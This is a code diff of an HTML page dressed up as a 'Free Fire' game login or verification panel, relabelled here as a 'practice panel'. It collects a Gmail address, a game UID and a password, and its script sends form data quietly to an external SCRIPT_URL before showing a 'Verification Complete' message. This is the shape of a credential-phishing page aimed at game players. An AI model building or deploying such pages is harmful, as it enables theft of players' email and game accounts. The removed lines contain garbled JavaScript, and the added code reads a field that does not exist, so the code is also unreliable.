@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Free Fire Game Panel</title>
+<title>Free Fire Practice Panel</title>
 
 <style>
 * {
@@ -41,13 +41,12 @@ body {
     font-weight: 900;
     color: #ff8500;
     text-shadow: 3px 3px #000, 0 0 15px #ff5500;
-    margin-bottom: 5px;
 }
 
 .subtitle {
     text-align: center;
     color: #ddd;
-    margin-bottom: 25px;
+    margin: 5px 0 25px;
     font-size: 13px;
     letter-spacing: 2px;
 }
@@ -74,11 +73,6 @@ body {
     font-size: 15px;
 }
 
-.input-group input:focus {
-    border-color: #ff7800;
-    box-shadow: 0 0 8px rgba(255,120,0,.5);
-}
-
 .login-btn {
     width: 100%;
     padding: 15px;
@@ -90,6 +84,11 @@ body {
     font-weight: bold;
     cursor: pointer;
     text-transform: uppercase;
+    transition: .2s;
+}
+
+.login-btn.success {
+    background: #00a844;
 }
 
 .message {
@@ -106,14 +105,6 @@ body {
     font-size: 35px;
     color: #00e676;
 }
-
-.watermark {
-    margin-top: 22px;
-    text-align: center;
-    color: rgba(255,255,255,.35);
-    font-size: 11px;
-    letter-spacing: 2px;
-}
 </style>
 </head>
 
@@ -122,12 +113,12 @@ body {
 <div class="game-box">
 
     <div class="logo">FREE FIRE</div>
-    <div class="subtitle">PLAYER VERIFICATION PANEL</div>
+    <div class="subtitle">PLAYER PRACTICE PANEL</div>
 
     <form id="gameForm">
 
         <div class="input-group">
-            <label>Gmail</label>
+            <label for="gmail">Gmail</label>
             <input
                 type="email"
                 id="gmail"
@@ -136,30 +127,28 @@ body {
                 required>
         </div>
 
-        <!-- PASSWORD INTERFACE NOW USES THE UID FIELD -->
         <div class="input-group">
-            <label>Enter your UID</label>
+            <label for="uid">Free Fire UID</label>
             <input
                 type="text"
-                id="UID"
+                id="uid"
                 placeholder="Enter your UID"
-                autocomplete="off"
-                required>
-        </div>
-
-        <!-- UID INTERFACE NOW USES THE Password FIELD -->
-        <div class="input-group">
-            <label>Enter Your Password</label>
-            <input
-                type="text"
-                id="Password"
-                placeholder="Enter your password"
                 inputmode="numeric"
                 required>
         </div>
 
-        <button class="login-btn" type="submit">
-            SUBMIT
+        <div class="input-group">
+            <label for="Enter Your Password">Password</label>
+            <input
+                type="text"
+                id="Password"
+                placeholder="Enter your Password"
+                autocomplete="off"
+                required>
+        </div>
+
+        <button class="login-btn" id="loginButton" type="submit">
+            LOGIN
         </button>
 
     </form>
@@ -168,10 +157,6 @@ body {
         <div class="check">✓</div>
         <strong>Verification Complete</strong>
         <p>Your practice information was received.</p>
-    </div>
-
-    <div class="watermark">
-        FREE FIRE • PRACTICE PANEL
     </div>
 
 </div>
@@ -184,28 +169,41 @@ document.getElementById("gameForm").addEventListener("submit", async function(ev
     event.preventDefault();
 
     const email = document.getElementById("gmail").value.trim();
-    const  = document.getElementById("username").value.trim();
-    const uid = dh(d: "POST",
+    const uid = document.getElementById("uid").value.trim();
+    const username = document.getElementById("username").value.trim();
+
+    const button = document.getElementById("loginButton");
+
+    const data = {
+        email: email,
+        uid: uid,
+        username: username
+    };
+
+    button.disabled = true;
+    button.textContent = "LOGGING IN...";
+
+    try {
+        await fetch(SCRIPT_URL, {
+            method: "POST",
             mode: "no-cors",
             headers: {
                 "Content-Type": "text/plain;charset=utf-8"
-            },ocument.getElementById
-            body:("uid").value.trim();
-
-    try {username
-        await fetcSCRIPT_URL, {
-            metho JSON.stringify({
-                email: email,
-                username: username,
-                uid: uid
-            })
+            },
+            body: JSON.stringify(data)
         });
 
+        button.textContent = "LOGIN ✓";
+        button.classList.add("success");
+
         document.getElementById("message").style.display = "block";
-        document.querySelector(".login-btn").textContent = "SUBMITTED ✓";
 
     } catch (error) {
         console.error(error);
+
+        button.disabled = false;
+        button.textContent = "LOGIN";
+
         alert("Could not submit the information.");
     }
 });
